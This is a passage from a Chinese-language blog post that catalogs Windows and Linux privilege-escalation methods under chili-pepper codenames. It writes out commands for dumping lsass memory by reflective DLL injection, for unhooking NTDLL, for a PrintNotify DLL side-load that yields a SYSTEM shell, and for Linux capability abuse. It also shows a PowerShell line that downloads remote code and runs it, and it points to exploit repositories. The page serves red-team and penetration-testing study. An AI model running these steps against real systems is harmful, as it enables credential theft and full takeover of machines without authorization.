+<p>操作系统：Windows</p>
+<p>类型：Create a Reflective DLL Injector + Reflective DLL for dump lsass memory without touch hard disk</p>
+<p>方法：</p>
+<ul>
+<li><code>#.\inject.x64.exe &lt;Path to reflective dll: .\LsassDumpReflectiveDLL.dll&gt;</code></li>
+</ul>
+<h3 id="Jalapeno-Chillies"><a href="#Jalapeno-Chillies" class="headerlink" title="Jalapeno Chillies"></a>Jalapeno Chillies</h3><p>域：Yes</p>
+<p>Local Admin: Yes</p>
+<p>操作系统：Windows</p>
+<p>方法：unhook NTDLL.dll + dump the lsass.exe as WindowsUpdateProvider.pod</p>
+<p>方法：</p>
+<ul>
+<li><code>NihilistGuy.exe</code></li>
+</ul>
+<p>批注：<a target="_blank" rel="noopener" href="https://github.com/analyticsearch/NihilistGuy">https://github.com/analyticsearch/NihilistGuy</a></p>
+<h3 id="Pasilla-Chili"><a href="#Pasilla-Chili" class="headerlink" title="Pasilla Chili"></a>Pasilla Chili</h3><p>域：Yes</p>
+<p>Local Admin: Yes</p>
+<p>操作系统：Windows</p>
+<p>方法：SeImpersonatePrivilege + Abusing Service Account Session</p>
+<p>方法：</p>
+<ul>
+<li><code>https://github.com/tyranid/blackhat-usa-2022-demos</code></li>
+<li><code>Demo5.ps1</code></li>
+</ul>
+<h3 id="Finger-Chilli"><a href="#Finger-Chilli" class="headerlink" title="Finger Chilli"></a>Finger Chilli</h3><p>域：No</p>
+<p>Local Admin: Yes</p>
+<p>操作系统：Windows</p>
+<p>类型：Abusing PrintNotify Service + DLL side-loading</p>
+<p>方法：</p>
+<ul>
+<li><code>以管理员身份，将winspool.drv和mod-ms-win-core-apiquery-l1-1-0.dll复制到C:\Windows\System32\spool\drivers\x64\3\</code></li>
+<li><code>将 /bin/ 中包含的所有文件放入同一目录中。</code></li>
+<li><code>然后，运行 powershell .\spooltrigger.ps1。</code></li>
+<li>享受 NT AUTHORITY\SYSTEM 的 shell。</li>
+</ul>
+<h3 id="Orange-Cayenne"><a href="#Orange-Cayenne" class="headerlink" title="Orange Cayenne"></a>Orange Cayenne</h3><p>域：Yes</p>
+<p>Local Admin: Yes</p>
+<p>操作系统：Windows</p>
+<p>类型：Silver Ticket + I Know</p>
+<p>方法：</p>
+<ul>
+<li><code>https://github.com/tyranid/blackhat-usa-2022-demos</code></li>
+<li><code>Demo1.ps1</code></li>
+</ul>
+<h3 id="Red-Cayenne"><a href="#Red-Cayenne" class="headerlink" title="Red Cayenne"></a>Red Cayenne</h3><p>域：Yes</p>
+<p>Local Admin: Yes</p>
+<p>操作系统：Windows</p>
+<p>类型：Silver ticket + User to User Authentication</p>
+<p>方法：</p>
+<ul>
+<li><code>https://github.com/tyranid/blackhat-usa-2022-demos</code></li>
+<li><code>demo2.ps1</code></li>
+</ul>
+<h3 id="Birds-Eye-Chilli"><a href="#Birds-Eye-Chilli" class="headerlink" title="Birds Eye Chilli"></a>Birds Eye Chilli</h3><p>域：Yes</p>
+<p>Local Admin: Yes</p>
+<p>操作系统：Windows</p>
+<p>类型：Silver Ticket + Buffer Type Confusion</p>
+<p>方法：</p>
+<ul>
+<li><code>https://github.com/tyranid/blackhat-usa-2022-demos</code></li>
+<li><code>Demo3.ps1</code></li>
+</ul>
+<h3 id="Scotch-Bonnet"><a href="#Scotch-Bonnet" class="headerlink" title="Scotch Bonnet"></a>Scotch Bonnet</h3><p>域：Yes</p>
+<p>Local Admin: Yes</p>
+<p>操作系统：Windows</p>
+<p>类型：Bring Your Own KDC</p>
+<p>方法：</p>
+<ul>
+<li><code>https://github.com/tyranid/blackhat-usa-2022-demos</code></li>
+<li><code>Demo4.ps1</code></li>
+</ul>
+<h3 id="Lemon-Habanero"><a href="#Lemon-Habanero" class="headerlink" title="Lemon Habanero"></a>Lemon Habanero</h3><p>域：No</p>
+<p>Local Admin: Yes</p>
+<p>操作系统：Linux</p>
+<p>类型：Capabilities</p>
+<p>方法：</p>
+<ul>
+<li><code>gcc -Wl,–no-as-needed -lcap-ng -o ambient ambient.c</code></li>
+<li><code>sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient</code></li>
+<li><code>./ambient /bin/bash</code></li>
+</ul>
+<p>批注：<a target="_blank" rel="noopener" href="https://github.com/bsauce/kernel_exploit_series/tree/master/2-arbitrary_rw">https://github.com/bsauce/kernel_exploit_series/tree/master/2-arbitrary_rw</a></p>
+<h3 id="Red-Habanero"><a href="#Red-Habanero" class="headerlink" title="Red Habanero"></a>Red Habanero</h3><p>域：No</p>
+<p>Local Admin: Yes</p>
+<p>操作系统：Windows</p>
+<p>类型：NtSetInformationProcess + DLL side-loading</p>
+<p>方法：</p>
+<ul>
+<li><code>BypassRtlSetProcessIsCritical.exe pid</code></li>
+</ul>
+<p>批注：没找到这个东西</p>
+<h3 id="Ghost-Pepper"><a href="#Ghost-Pepper" class="headerlink" title="Ghost Pepper"></a>Ghost Pepper</h3><p>域：No</p>
+<p>Local Admin: Yes</p>
+<p>操作系统：Windows</p>
+<p>类型： <strong>allow low privileged user accounts to create file system and registry symbolic links</strong></p>
+<p>方法：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="variable">$code</span> = (<span class="built_in">iwr</span> https://raw.githubusercontent.com/usdAG/SharpLink/main/SharpLink.cs).content</span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Add-Type</span> <span class="variable">$code</span>                                                                                          </span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="variable">$s</span> = <span class="built_in">New-Object</span> de.usd.SharpLink.Symlink(“C:\Users\Public\Example\link”, “C:\ProgramData\target.txt”)</span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="variable">$s</span>.Open()</span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">echo</span> “Hello World :D” &gt; C:\Users\Public\Example\link</span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">type</span> C:\ProgramData\target.txt</span><br><span class="line">Hello World 😀</span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="variable">$s</span>.Close()</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="Chocolate-Scorpion-Chilli"><a href="#Chocolate-Scorpion-Chilli" class="headerlink" title="Chocolate Scorpion Chilli"></a>Chocolate Scorpion Chilli</h3><p>域：No</p>
+<p>Local Admin: Yes</p>
+<p>操作系统：Windows</p>
+<p>类型：Directory-Deletion + Windows Media Player d/s</p>
+<p>方法：</p>
+<ul>
+<li><code>https://github.com/sailay1996/delete2SYSTEM</code></li>
+<li><code>.\poc.ps1</code></li>
+</ul>
+<h3 id="Carolina-Reaper"><a href="#Carolina-Reaper" class="headerlink" title="Carolina Reaper"></a>Carolina Reaper</h3><p>域：Yes</p>
+<p>Local Admin: Yes</p>
+<p>操作系统：Windows</p>
+<p>类型：Creates an arbitrary service + PTH</p>
+<p>方法：</p>
+<ul>
+<li><code>https://github.com/tyranid/blackhat-usa-2022-demos</code></li>
+<li><code>Demo6.ps1</code></li>
+</ul>
+<h3 id="The-Intimidator-Chilli"><a href="#The-Intimidator-Chilli" class="headerlink" title="The Intimidator Chilli"></a>The Intimidator Chilli</h3><p>域：No</p>
+<p>Local Admin: Yes</p>
+<p>操作系统：Windows</p>
+<p>类型：manipulate memory/process token values/NT system calls and objects/NT object manager</p>
+<p>方法：</p>
+<ul>
+<li><code>https://github.com/googleprojectzero/sandbox-attacksurface-analysis-tools</code></li>
+<li><code>Import-Module NtObjectManager</code></li>
+<li><code>Get-ChildItem NtObject:\</code></li>
+<li><code>NT*</code></li>
+</ul>
+<h2 id="原文地址："><a href="#原文地址：" class="headerlink" title="原文地址："></a>原文地址：</h2><p><a target="_blank" rel="noopener" href="https://hadess.io/74-methods-for-privilege-escalationpart-2/">https://hadess.io/74-methods-for-privilege-escalationpart-2/</a></p>
+<p><a target="_blank" rel="noopener" href="https://hadess.io/43-methods-for-privilege-escalation-part-3/">https://hadess.io/43-methods-for-privilege-escalation-part-3/</a></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://endermanneer.github.io">Enderman_1</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://endermanneer.github.io/2024/01/22/%E5%B0%8F%E5%AF%84%E5%B7%A7/117%E7%A7%8D%E6%8F%90%E6%9D%83%E6%89%8B%E6%B3%95/">https://endermanneer.github.io/2024/01/22/%E5%B0%8F%E5%AF%84%E5%B7%A7/117%E7%A7%8D%E6%8F%90%E6%9D%83%E6%89%8B%E6%B3%95/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://endermanneer.github.io" target="_blank">Enderman_1's blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%8F%90%E6%9D%83/">提权</a></div><div class="post_share"><div class="social-share" data-image="https://endermanneer.oss-cn-guangzhou.aliyuncs.com/touxiang.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2024/01/22/%E5%AF%86%E7%A0%81%E5%AD%A6/%E7%AC%AC%E5%9B%9B%E8%AE%B2%20%E5%85%AC%E9%92%A5%E5%AF%86%E7%A0%81%E4%BD%93%E5%88%B6/" title="第四讲 公钥密码体制"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">第四讲 公钥密码体制</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://endermanneer.oss-cn-guangzhou.aliyuncs.com/touxiang.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Enderman_1</div><div class="author-info__description">A fictional character not yet born...</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">63</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">25</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">54</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Endermanneer"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">尚处于摸爬带滚阶段</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%8F%90%E6%9D%83%E6%89%8B%E6%B3%95%E6%94%B6%E9%9B%86"><span class="toc-number">1.</span> <span class="toc-text">提权手法收集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#DirtyC0w"><span class="toc-number">1.0.1.</span> <span class="toc-text">DirtyC0w</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2016-1531"><span class="toc-number">1.0.2.</span> <span class="toc-text">CVE-2016-1531</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Polkit"><span class="toc-number">1.0.3.</span> <span class="toc-text">Polkit</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DirtyPipe"><span class="toc-number">1.0.4.</span> <span class="toc-text">DirtyPipe</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PwnKit"><span class="toc-number">1.0.5.</span> <span class="toc-text">PwnKit</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ms14-058"><span class="toc-number">1.0.6.</span> <span class="toc-text">ms14_058</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Hot-Potato"><span class="toc-number">1.0.7.</span> <span class="toc-text">Hot Potato</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Intel-SYSRET"><span class="toc-number">1.0.8.</span> <span class="toc-text">Intel SYSRET</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PrintNightmare"><span class="toc-number">1.0.9.</span> <span class="toc-text">PrintNightmare</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Folina"><span class="toc-number">1.0.10.</span> <span class="toc-text">Folina</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ALPC"><span class="toc-number">1.0.11.</span> <span class="toc-text">ALPC</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#RemotePotato0"><span class="toc-number">1.0.12.</span> <span class="toc-text">RemotePotato0</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2022-26923"><span class="toc-number">1.0.13.</span> <span class="toc-text">CVE-2022-26923</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MS14-068"><span class="toc-number">1.0.14.</span> <span class="toc-text">MS14-068</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Sudo-LD-PRELOAD"><span class="toc-number">1.0.15.</span> <span class="toc-text">Sudo LD_PRELOAD</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Abusing-File-Permission-via-SUID-Binaries-%E2%80%93-so-injection"><span class="toc-number">1.0.16.</span> <span class="toc-text">Abusing File Permission via SUID Binaries – .so injection)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DLL-Injection"><span class="toc-number">1.0.17.</span> <span class="toc-text">DLL Injection</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Early-Bird-Injection"><span class="toc-number">1.0.18.</span> <span class="toc-text">Early Bird Injection</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Process-Injection-through-Memory-Section"><span class="toc-number">1.0.19.</span> <span class="toc-text">Process Injection through Memory Section</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Abusing-Scheduled-Tasks-via-Cron-Path-Overwrite"><span class="toc-number">1.0.20.</span> <span class="toc-text">Abusing Scheduled Tasks via Cron Path Overwrite</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Abusing-Scheduled-Tasks-via-Cron-Wildcards"><span class="toc-number">1.0.21.</span> <span class="toc-text">Abusing Scheduled Tasks via Cron Wildcards</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Abusing-File-Permission-via-SUID-Binaries-%E2%80%93-Symlink"><span class="toc-number">1.0.22.</span> <span class="toc-text">Abusing File Permission via SUID Binaries – Symlink)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Abusing-File-Permission-via-SUID-Binaries-%E2%80%93-Environment-Variables-1"><span class="toc-number">1.0.23.</span> <span class="toc-text">Abusing File Permission via SUID Binaries – Environment Variables #1)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Abusing-File-Permission-via-SUID-Binaries-%E2%80%93-Environment-Variables-2"><span class="toc-number">1.0.24.</span> <span class="toc-text">Abusing File Permission via SUID Binaries – Environment Variables #2)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DLL-Hijacking"><span class="toc-number">1.0.25.</span> <span class="toc-text">DLL Hijacking</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Abusing-Services-via-binPath"><span class="toc-number">1.0.26.</span> <span class="toc-text">Abusing Services via binPath</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Abusing-Services-via-Unquoted-Path"><span class="toc-number">1.0.27.</span> <span class="toc-text">Abusing Services via Unquoted Path</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Abusing-Services-via-Registry"><span class="toc-number">1.0.28.</span> <span class="toc-text">Abusing Services via Registry</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Abusing-Services-via-Executable-File"><span class="toc-number">1.0.29.</span> <span class="toc-text">Abusing Services via Executable File</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Abusing-Services-via-Autorun"><span class="toc-number">1.0.30.</span> <span class="toc-text">Abusing Services via Autorun</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Abusing-Services-via-AlwaysInstallElevated"><span class="toc-number">1.0.31.</span> <span class="toc-text">Abusing Services via AlwaysInstallElevated</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Abusing-Services-via-SeCreateToken"><span class="toc-number">1.0.32.</span> <span class="toc-text">Abusing Services via SeCreateToken</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Abusing-Services-via-SeDebug"><span class="toc-number">1.0.33.</span> <span class="toc-text">Abusing Services via SeDebug</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Remote-Process-via-Syscalls-HellsGate-Hal%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9FGate"><span class="toc-number">1.0.34.</span> <span class="toc-text">Remote Process via Syscalls (HellsGate|Hal操作系统Gate)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Escalate-With-DuplicateTokenEx"><span class="toc-number">1.0.35.</span> <span class="toc-text">Escalate With DuplicateTokenEx</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Abusing-Services-via-SeIncreaseBasePriority"><span class="toc-number">1.0.36.</span> <span class="toc-text">Abusing Services via SeIncreaseBasePriority</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Abusing-Services-via-SeManageVolume"><span class="toc-number">1.0.37.</span> <span class="toc-text">Abusing Services via SeManageVolume</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Abusing-Services-via-SeRelabel"><span class="toc-number">1.0.38.</span> <span class="toc-text">Abusing Services via SeRelabel</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Abusing-Services-via-SeRestore"><span class="toc-number">1.0.39.</span> <span class="toc-text">Abusing Services via SeRestore</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Abuse-via-SeBackup"><span class="toc-number">1.0.40.</span> <span class="toc-text">Abuse via SeBackup</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Abusing-via-SeCreatePagefile"><span class="toc-number">1.0.41.</span> <span class="toc-text">Abusing via SeCreatePagefile</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Abusing-via-SeSystemEnvironment"><span class="toc-number">1.0.42.</span> <span class="toc-text">Abusing via SeSystemEnvironment</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Abusing-via-SeTakeOwnership"><span class="toc-number">1.0.43.</span> <span class="toc-text">Abusing via SeTakeOwnership</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Abusing-via-SeTcb"><span class="toc-number">1.0.44.</span> <span class="toc-text">Abusing via SeTcb</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Abusing-via-SeTrustedCredManAccess"><span class="toc-number">1.0.45.</span> <span class="toc-text">Abusing via SeTrustedCredManAccess</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Abusing-tokens-via-SeAssignPrimaryToken"><span class="toc-number">1.0.46.</span> <span class="toc-text">Abusing tokens via SeAssignPrimaryToken</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Abusing-via-SeCreatePagefile-1"><span class="toc-number">1.0.47.</span> <span class="toc-text">Abusing via SeCreatePagefile</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Certificate-Abuse"><span class="toc-number">1.0.48.</span> <span class="toc-text">Certificate Abuse</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Password-Mining-in-Memory"><span class="toc-number">1.0.49.</span> <span class="toc-text">Password Mining in Memory</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Password-Mining-in-Memory-1"><span class="toc-number">1.1.</span> <span class="toc-text">Password Mining in Memory</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Password-Mining-in-Registry"><span class="toc-number">1.1.1.</span> <span class="toc-text">Password Mining in Registry</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Password-Mining-in-General-Events-via-SeAudit"><span class="toc-number">1.1.2.</span> <span class="toc-text">Password Mining in General Events via SeAudit</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Password-Mining-in-Security-Events-via-SeSecurity"><span class="toc-number">1.1.3.</span> <span class="toc-text">Password Mining in Security Events via SeSecurity</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Startup-Applications"><span class="toc-number">1.1.4.</span> <span class="toc-text">Startup Applications</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Password-Mining-in-McAfeeSitelistFiles"><span class="toc-number">1.1.5.</span> <span class="toc-text">Password Mining in McAfeeSitelistFiles</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Password-Mining-in-CachedGPPPassword"><span class="toc-number">1.1.6.</span> <span class="toc-text">Password Mining in CachedGPPPassword</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Password-Mining-in-DomainGPPPassword"><span class="toc-number">1.1.7.</span> <span class="toc-text">Password Mining in DomainGPPPassword</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Password-Mining-in-KeePass"><span class="toc-number">1.1.8.</span> <span class="toc-text">Password Mining in KeePass</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Password-Mining-in-WindowsVault"><span class="toc-number">1.1.9.</span> <span class="toc-text">Password Mining in WindowsVault</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Password-Mining-in-SecPackageCreds"><span class="toc-number">1.1.10.</span> <span class="toc-text">Password Mining in SecPackageCreds</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Password-Mining-in-PuttyH%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9FtKeys"><span class="toc-number">1.1.11.</span> <span class="toc-text">Password Mining in PuttyH操作系统tKeys</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Password-Mining-in-RDCManFiles"><span class="toc-number">1.1.12.</span> <span class="toc-text">Password Mining in RDCManFiles</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Password-Mining-in-RDPSavedConnections"><span class="toc-number">1.1.13.</span> <span class="toc-text">Password Mining in RDPSavedConnections</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Password-Mining-in-MasterKeys"><span class="toc-number">1.1.14.</span> <span class="toc-text">Password Mining in MasterKeys</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Password-Mining-in-Browsers"><span class="toc-number">1.1.15.</span> <span class="toc-text">Password Mining in Browsers</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Password-Mining-in-Files"><span class="toc-number">1.1.16.</span> <span class="toc-text">Password Mining in Files</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Password-Mining-in-LDAP"><span class="toc-number">1.1.17.</span> <span class="toc-text">Password Mining in LDAP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Password-Mining-in-Clipboard"><span class="toc-number">1.1.18.</span> <span class="toc-text">Password Mining in Clipboard</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Password-Mining-in-GMSA-Password"><span class="toc-number">1.1.19.</span> <span class="toc-text">Password Mining in GMSA Password</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Delegate-tokens-via-RDP"><span class="toc-number">1.1.20.</span> <span class="toc-text">Delegate tokens via RDP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Delegate-tokens-via-FTP"><span class="toc-number">1.1.21.</span> <span class="toc-text">Delegate tokens via FTP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Fake-Logon-Screen"><span class="toc-number">1.1.22.</span> <span class="toc-text">Fake Logon Screen</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Abusing-WinRM-Services"><span class="toc-number">1.1.23.</span> <span class="toc-text">Abusing WinRM Services</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Dump-lsass-with-SilentProcessExit"><span class="toc-number">1.1.24.</span> <span class="toc-text">Dump lsass with SilentProcessExit</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Lsass-Shtinkering"><span class="toc-number">1.1.25.</span> <span class="toc-text">Lsass Shtinkering</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#AndrewSpecial"><span class="toc-number">1.1.26.</span> <span class="toc-text">AndrewSpecial</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CCACHE-ticket-reuse-from-tmp"><span class="toc-number">1.1.27.</span> <span class="toc-text">CCACHE ticket reuse from &#x2F;tmp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CCACHE-ticket-reuse-from-keyring"><span class="toc-number">1.1.28.</span> <span class="toc-text">CCACHE ticket reuse from keyring</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CCACHE-ticket-reuse-from-SSSD-KCM"><span class="toc-number">1.1.29.</span> <span class="toc-text">CCACHE ticket reuse from SSSD KCM</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CCACHE-ticket-reuse-from-keytab"><span class="toc-number">1.1.30.</span> <span class="toc-text">CCACHE ticket reuse from keytab</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SSH-Forwarder"><span class="toc-number">1.1.31.</span> <span class="toc-text">SSH Forwarder</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DLL-Search-Order-Hijacking"><span class="toc-number">1.1.32.</span> <span class="toc-text">DLL Search Order Hijacking</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Slui-File-Handler-Hijack-LPE"><span class="toc-number">1.1.33.</span> <span class="toc-text">Slui File Handler Hijack LPE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CDPSvc-DLL-Hijacking"><span class="toc-number">1.1.34.</span> <span class="toc-text">CDPSvc DLL Hijacking</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Magnify-exe-Dll-Search-Order-Hijacking"><span class="toc-number">1.1.35.</span> <span class="toc-text">Magnify.exe Dll Search Order Hijacking</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CdpSvc-Service"><span class="toc-number">1.1.36.</span> <span class="toc-text">CdpSvc Service</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HiveNightmare"><span class="toc-number">1.1.37.</span> <span class="toc-text">HiveNightmare</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Abusing-with-FileRestorePrivilege"><span class="toc-number">1.1.38.</span> <span class="toc-text">Abusing with FileRestorePrivilege</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Abusing-with-RestoreAndBackupPrivileges"><span class="toc-number">1.1.39.</span> <span class="toc-text">Abusing with RestoreAndBackupPrivileges</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Abusing-with-ShadowCopyBackupPrivilege"><span class="toc-number">1.1.40.</span> <span class="toc-text">Abusing with ShadowCopyBackupPrivilege</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Abusing-with-ShadowCopy"><span class="toc-number">1.1.41.</span> <span class="toc-text">Abusing with ShadowCopy</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Dynamic-Phishing"><span class="toc-number">1.1.42.</span> <span class="toc-text">Dynamic Phishing</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Race-Conditions"><span class="toc-number">1.1.43.</span> <span class="toc-text">Race Conditions</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Abusing-usermode-helper-API"><span class="toc-number">1.1.44.</span> <span class="toc-text">Abusing usermode helper API</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Escape-only-with-CAP-SYS-ADMIN-capability"><span class="toc-number">1.1.45.</span> <span class="toc-text">Escape only with CAP_SYS_ADMIN capability</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Abusing-exposed-host-directories"><span class="toc-number">1.1.46.</span> <span class="toc-text">Abusing exposed host directories</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Unix-Wildcard"><span class="toc-number">1.1.47.</span> <span class="toc-text">Unix Wildcard</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Socket-Command-Injection"><span class="toc-number">1.1.48.</span> <span class="toc-text">Socket Command Injection</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Logstash"><span class="toc-number">1.1.49.</span> <span class="toc-text">Logstash</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#UsoDllLoader"><span class="toc-number">1.1.50.</span> <span class="toc-text">UsoDllLoader</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Trend-Chain-Methods-for-Privilege-Escalation"><span class="toc-number">1.1.51.</span> <span class="toc-text">Trend Chain Methods for Privilege Escalation</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Habanero-Chilli"><span class="toc-number">1.1.52.</span> <span class="toc-text">Habanero Chilli</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Padron-Chilli"><span class="toc-number">1.1.53.</span> <span class="toc-text">Padron Chilli</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" 